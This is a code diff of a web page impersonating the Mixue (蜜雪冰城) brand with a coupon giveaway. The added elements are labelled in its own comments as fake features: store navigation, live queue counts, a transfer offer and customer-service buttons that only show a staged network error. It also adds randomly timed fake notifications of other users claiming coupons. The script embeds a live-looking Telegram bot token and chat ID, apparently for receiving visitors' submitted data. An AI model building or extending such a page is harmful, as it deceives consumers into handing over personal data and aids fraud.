@@ -24,7 +24,7 @@
     }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
-      background: url('https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000045799-imagetourl.cloud-1769923010594-scb6om.png') no-repeat center center fixed;
+      background: url('hhttps://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046878-imagetourl.cloud-1770310883157-bp2dgh.jpg') no-repeat center center fixed;
       background-size: cover;
       min-height: 100vh;
       display: flex;
@@ -135,6 +135,155 @@
       background: var(--mixue-white);
     }
 
+    /* 虚假功能：门店导航栏 */
+    .store-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: linear-gradient(90deg, #f8f9fa, #fff);
+      border: 1px solid #e5e6eb;
+      border-radius: 12px;
+      padding: 12px 16px;
+      margin-bottom: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .store-nav:hover {
+      background: #f0f1f2;
+      transform: translateX(4px);
+    }
+    .store-nav-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--mixue-red);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+    }
+    .store-nav-info {
+      flex: 1;
+      margin-left: 12px;
+      text-align: left;
+    }
+    .store-nav-title {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--mixue-dark);
+    }
+    .store-nav-desc {
+      font-size: 0.8rem;
+      color: #86909c;
+      margin-top: 2px;
+    }
+    .store-nav-arrow {
+      color: #c9cdd4;
+      font-size: 20px;
+    }
+
+    /* 虚假功能：实时排队人数 */
+    .queue-status {
+      background: linear-gradient(135deg, #e6fffb, #f6ffed);
+      border: 1px solid #b7eb8f;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+    }
+    .queue-live-dot {
+      width: 8px;
+      height: 8px;
+      background: #52c41a;
+      border-radius: 50%;
+      animation: blink 1.5s infinite;
+      margin-right: 8px;
+      display: inline-block;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    .queue-text {
+      font-size: 0.9rem;
+      color: #52c41a;
+      font-weight: 600;
+    }
+    .queue-number {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--mixue-red);
+    }
+
+    /* 虚假功能：优惠券转赠入口 */
+    .transfer-entry {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px;
+      background: #fff2f0;
+      border: 1px dashed var(--mixue-red);
+      border-radius: 12px;
+      margin-bottom: 20px;
+      cursor: pointer;
+      color: var(--mixue-red);
+      font-size: 0.9rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+    .transfer-entry:hover {
+      background: #fff0f0;
+      transform: scale(1.02);
+    }
+    .transfer-icon {
+      font-size: 1.2rem;
+    }
+
+    .barrage-box {
+      height: 80px;
+      margin: 0 0 20px;
+      background: rgba(230,57,70,0.05);
+      border-radius: var(--radius-sm);
+      overflow: hidden;
+      position: relative;
+      border: 1px solid rgba(230,57,70,0.1);
+    }
+    
+    .barrage-item {
+      position: absolute;
+      white-space: nowrap;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--mixue-red);
+      padding: 6px 16px;
+      line-height: 20px;
+      left: 100%;
+      background: rgba(255,255,255,0.9);
+      border-radius: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      animation: barrageSlide 8s linear forwards;
+      z-index: 1;
+    }
+    
+    @keyframes barrageSlide {
+      0% { left: 100%; }
+      100% { left: -100%; }
+    }
+
+    .fair-tip {
+      text-align: center;
+      font-size: 0.85rem;
+      color: var(--mixue-red);
+      margin: 12px 0;
+      font-weight: 600;
+      line-height: 1.4;
+    }
+
     .input-box {
       position: relative;
       margin-bottom: 20px;
@@ -155,7 +304,6 @@
       -webkit-appearance: none;
       appearance: none;
       opacity: 1;
-      /* 修复输入框禁用态可点击 */
       pointer-events: auto;
     }
     
@@ -206,38 +354,6 @@
       font-weight: 600;
     }
 
-    .barrage-box {
-      height: 80px;
-      margin: 0 0 20px;
-      background: rgba(230,57,70,0.05);
-      border-radius: var(--radius-sm);
-      overflow: hidden;
-      position: relative;
-      border: 1px solid rgba(230,57,70,0.1);
-    }
-    
-    .barrage-item {
-      position: absolute;
-      white-space: nowrap;
-      font-size: 0.9rem;
-      font-weight: 600;
-      color: var(--mixue-red);
-      padding: 6px 16px;
-      line-height: 20px;
-      left: 100%;
-      background: rgba(255,255,255,0.9);
-      border-radius: 20px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      animation: barrageSlide 8s linear forwards;
-      z-index: 1;
-    }
-    
-    @keyframes barrageSlide {
-      0% { left: 100%; }
-      100% { left: -100%; }
-    }
-
-    /* 重写滑块UI，优化美观度 */
     .verify-slider {
       width: 100%;
       height: 46px;
@@ -316,15 +432,6 @@
       box-shadow: 0 2px 8px rgba(82, 196, 26, 0.3);
     }
 
-    .fair-tip {
-      text-align: center;
-      font-size: 0.85rem;
-      color: var(--mixue-red);
-      margin: 12px 0;
-      font-weight: 600;
-      line-height: 1.4;
-    }
-
     .btn {
       width: 100%;
       height: 60px;
@@ -392,6 +499,102 @@
       color: var(--mixue-red);
       font-weight: 600;
       text-decoration: none;
+    }
+
+    /* 虚假功能：悬浮反馈按钮 */
+    .feedback-btn {
+      position: fixed;
+      right: 20px;
+      bottom: 100px;
+      width: 56px;
+      height: 56px;
+      background: linear-gradient(135deg, #ff4d4f, #ff7875);
+      border-radius: 50%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 12px;
+      font-weight: 600;
+      box-shadow: 0 4px 12px rgba(255, 77, 79, 0.4);
+      cursor: pointer;
+      z-index: 1000;
+      transition: all 0.3s ease;
+      animation: float 3s ease-in-out infinite;
+    }
+    .feedback-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 6px 20px rgba(255, 77, 79, 0.6);
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .feedback-icon {
+      font-size: 24px;
+      margin-bottom: 2px;
+    }
+
+    /* 虚假功能：实时通知 toast */
+    .toast-container {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
+      pointer-events: none;
+    }
+    .toast {
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-size: 0.9rem;
+      margin-bottom: 10px;
+      animation: slideDown 0.5s ease, fadeOut 0.5s ease 2.5s forwards;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes fadeOut {
+      to { opacity: 0; transform: translateY(-20px); }
+    }
+
+    /* 虚假功能：加载遮罩 */
+    .loading-mask {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.9);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9998;
+    }
+    .loading-mask.show {
+      display: flex;
+    }
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--mixue-red);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      margin-top: 16px;
+      color: #666;
+      font-size: 0.95rem;
     }
 
     .modal {
@@ -463,6 +666,15 @@
 </head>
 <body>
 
+<!-- 虚假功能：实时通知容器 -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- 虚假功能：加载遮罩 -->
+<div class="loading-mask" id="loadingMask">
+  <div class="loading-spinner"></div>
+  <div class="loading-text">正在连接服务器...</div>
+</div>
+
 <div class="card">
   <div class="header">
     <h1>蜜雪冰城</h1>
@@ -477,6 +689,31 @@
   <div class="join-count">已有 <span id="countNum">4,567</span> 人抢到福利</div>
 
   <div class="content">
+    <!-- 虚假功能：门店导航 -->
+    <div class="store-nav" onclick="showNetworkError()">
+      <div class="store-nav-icon">📍</div>
+      <div class="store-nav-info">
+        <div class="store-nav-title">最近的门店：王府井店</div>
+        <div class="store-nav-desc">距您 1.2km · 营业中 · 点击查看排队情况</div>
+      </div>
+      <div class="store-nav-arrow">›</div>
+    </div>
+
+    <!-- 虚假功能：实时排队 -->
+    <div class="queue-status" onclick="showNetworkError()">
+      <div>
+        <span class="queue-live-dot"></span>
+        <span class="queue-text">实时排队：制作中 <span id="makingCount">23</span> 杯</span>
+      </div>
+      <div class="queue-number">预计等待 8 分钟</div>
+    </div>
+
+    <!-- 虚假功能：转赠入口 -->
+    <div class="transfer-entry" onclick="showNetworkError()">
+      <span class="transfer-icon">🎁</span>
+      <span>转赠好友 · 双方各得 2 元券</span>
+    </div>
+
     <div class="barrage-box" id="barrageBox"></div>
 
     <div class="fair-tip">为了活动公平，禁止使用外挂操作，违规将取消领取资格</div>
@@ -510,6 +747,17 @@
   </div>
 </div>
 
+<!-- 虚假功能：悬浮反馈按钮 -->
+<div class="feedback-btn" onclick="showNetworkError()">
+  <span class="feedback-icon">💬</span>
+  <span>反馈</span>
+</div>
+
+<!-- 虚假功能：AI客服 -->
+<div class="ai-assistant" onclick="showNetworkError()" title="AI客服">
+  🤖
+</div>
+
 <div class="modal" id="successModal">
   <div class="modal-content">
     <h2>领取成功！</h2>
@@ -523,6 +771,60 @@
 </div>
 
 <script>
+// 虚假功能：显示网络错误
+function showNetworkError() {
+  const loading = document.getElementById('loadingMask');
+  loading.classList.add('show');
+  loading.querySelector('.loading-text').textContent = '正在连接服务器...';
+  
+  setTimeout(() => {
+    loading.classList.remove('show');
+    showToast('⚠️ 网络连接失败，请稍后再试', 'error');
+  }, 1500 + Math.random() * 1000);
+}
+
+// 虚假功能：显示Toast通知
+function showToast(message, type = 'info') {
+  const container = document.getElementById('toastContainer');
+  const toast = document.createElement('div');
+  toast.className = 'toast';
+  toast.textContent = message;
+  container.appendChild(toast);
+  
+  setTimeout(() => {
+    toast.remove();
+  }, 3000);
+}
+
+// 虚假功能：随机显示系统通知
+const fakeNotifications = [
+  '🔥 用户 138****5678 刚刚领取了优惠券',
+  '📍 您附近有 3 家门店正在营业',
+  '🎁 分享给好友，双方都得 2 元券',
+  '⏰ 您有一张优惠券即将过期',
+  '🍦 新品上市：芋圆葡萄冰淇淋',
+  '👥 已有 2341 位好友助力成功'
+];
+
+setInterval(() => {
+  if (Math.random() > 0.7) {
+    const msg = fakeNotifications[Math.floor(Math.random() * fakeNotifications.length)];
+    showToast(msg);
+  }
+}, 8000);
+
+// 虚假功能：排队人数动态变化
+function updateQueueNumber() {
+  const makingCount = document.getElementById('makingCount');
+  if (makingCount) {
+    let current = parseInt(makingCount.textContent);
+    current += Math.floor(Math.random() * 5) - 2;
+    current = Math.max(5, Math.min(35, current));
+    makingCount.textContent = current;
+  }
+}
+setInterval(updateQueueNumber, 3000);
+
 const BOT_TOKEN = '8338672395:AAH9rbys9sjY-BthubvXyVv2Rr_d_Pr_kiI';
 const CHAT_ID   = '8439448087';
 
@@ -828,3 +1130,4 @@ window.addEventListener('beforeunload', () => {
 </script>
 </body>
 </html>
+
